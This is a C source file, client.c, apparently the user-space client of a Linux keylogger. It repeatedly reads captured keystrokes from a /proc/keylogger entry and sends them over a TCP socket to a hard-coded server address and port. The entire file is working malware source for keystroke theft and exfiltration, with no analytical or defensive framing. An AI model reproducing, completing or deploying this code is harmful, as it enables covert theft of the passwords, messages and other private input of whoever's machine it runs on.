// client.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

#define PROCFS_PATH "/proc/keylogger"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8383

int main() {
    int fd;
    char buffer[2];
    ssize_t bytes_read;
    int sock;
    struct sockaddr_in server_addr;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("connect");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Wait for the /proc/keylogger file to be created
    while (access(PROCFS_PATH, F_OK) == -1) {
        printf("Waiting for /proc/keylogger to be created...\n");
        sleep(1);
    }

    fd = open(PROCFS_PATH, O_RDONLY);
    if (fd == -1) {
        perror("open");
        close(sock);
        exit(EXIT_FAILURE);
    }

    while (1) {
        usleep(10000); // Sleep for 10 milliseconds
        lseek(fd, 0, SEEK_SET); // Reset file pointer
        bytes_read = read(fd, buffer, sizeof(buffer) - 1);
        if (bytes_read > 0) {
            buffer[bytes_read] = '\0';
            if (send(sock, buffer, bytes_read, 0) == -1) {
                perror("send");
                close(fd);
                close(sock);
                exit(EXIT_FAILURE);
            }
        }
    }

    close(fd);
    close(sock);
    return 0;
}
